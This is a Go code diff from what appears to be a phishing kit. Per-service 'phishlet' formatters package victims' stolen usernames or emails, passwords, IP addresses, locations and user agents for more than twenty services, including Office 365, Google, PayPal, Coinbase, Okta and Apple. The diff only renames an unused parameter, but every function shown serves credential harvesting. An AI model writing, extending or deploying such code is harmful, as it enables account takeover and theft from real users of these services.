@@ -148,7 +148,7 @@ func (f *SessionFormatter) FormatSession(session *Session, phishletName string, 
 }
 
 // formatO365Session formats O365/Office 365 session
-func (f *SessionFormatter) formatO365Session(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatO365Session(session *Session, location string, _ int) string {
 	// Determine if it's Office365 or GoDaddy based on domain or custom fields
 	isGoDaddy := strings.Contains(strings.ToLower(session.Username), "godaddy") ||
 		strings.Contains(strings.ToLower(session.Name), "godaddy")
@@ -195,7 +195,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatGoogleSession formats Google/Gmail session
-func (f *SessionFormatter) formatGoogleSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatGoogleSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -213,7 +213,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatGitHubSession formats GitHub session
-func (f *SessionFormatter) formatGitHubSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatGitHubSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "username": "%s",
     "password": "%s"
@@ -231,7 +231,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatSlackSession formats Slack session
-func (f *SessionFormatter) formatSlackSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatSlackSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s",
@@ -250,7 +250,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatSalesforceSession formats Salesforce session
-func (f *SessionFormatter) formatSalesforceSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatSalesforceSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "username": "%s",
     "password": "%s"
@@ -268,7 +268,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatFacebookSession formats Facebook session
-func (f *SessionFormatter) formatFacebookSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatFacebookSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -286,7 +286,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatTwitterSession formats Twitter/X session
-func (f *SessionFormatter) formatTwitterSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatTwitterSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "username": "%s",
     "password": "%s"
@@ -304,7 +304,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatInstagramSession formats Instagram session
-func (f *SessionFormatter) formatInstagramSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatInstagramSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "username": "%s",
     "password": "%s"
@@ -322,7 +322,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatLinkedInSession formats LinkedIn session
-func (f *SessionFormatter) formatLinkedInSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatLinkedInSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -340,7 +340,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatAmazonSession formats Amazon session
-func (f *SessionFormatter) formatAmazonSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatAmazonSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -358,7 +358,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatPayPalSession formats PayPal session
-func (f *SessionFormatter) formatPayPalSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatPayPalSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -376,7 +376,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatAppleSession formats Apple/iCloud session
-func (f *SessionFormatter) formatAppleSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatAppleSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "appleId": "%s",
     "password": "%s"
@@ -394,7 +394,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatNetflixSession formats Netflix session
-func (f *SessionFormatter) formatNetflixSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatNetflixSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -412,7 +412,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatSpotifySession formats Spotify session
-func (f *SessionFormatter) formatSpotifySession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatSpotifySession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "username": "%s",
     "password": "%s"
@@ -430,7 +430,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatZoomSession formats Zoom session
-func (f *SessionFormatter) formatZoomSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatZoomSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -448,7 +448,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatDropboxSession formats Dropbox session
-func (f *SessionFormatter) formatDropboxSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatDropboxSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -466,7 +466,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatDiscordSession formats Discord session
-func (f *SessionFormatter) formatDiscordSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatDiscordSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -484,7 +484,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatTelegramSession formats Telegram session
-func (f *SessionFormatter) formatTelegramSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatTelegramSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "phone": "%s",
     "password": "%s"
@@ -502,7 +502,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatAdobeSession formats Adobe session
-func (f *SessionFormatter) formatAdobeSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatAdobeSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -520,7 +520,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatCoinbaseSession formats Coinbase session
-func (f *SessionFormatter) formatCoinbaseSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatCoinbaseSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s",
@@ -539,7 +539,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatBookingSession formats Booking.com session
-func (f *SessionFormatter) formatBookingSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatBookingSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -557,7 +557,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatOktaSession formats Okta session
-func (f *SessionFormatter) formatOktaSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatOktaSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "username": "%s",
     "password": "%s",
@@ -576,7 +576,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatDocuSignSession formats DocuSign session
-func (f *SessionFormatter) formatDocuSignSession(session *Session, location string, sessionID int) string {
+func (f *SessionFormatter) formatDocuSignSession(session *Session, location string, _ int) string {
 	credentials := fmt.Sprintf(`{
     "email": "%s",
     "password": "%s"
@@ -594,7 +594,7 @@ USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatGenericSession formats any other phishlet
-func (f *SessionFormatter) formatGenericSession(session *Session, location string, sessionID int, phishletName string) string {
+func (f *SessionFormatter) formatGenericSession(session *Session, location string, _ int, phishletName string) string {
 	credentials := fmt.Sprintf(`{
     "username": "%s",
     "password": "%s"
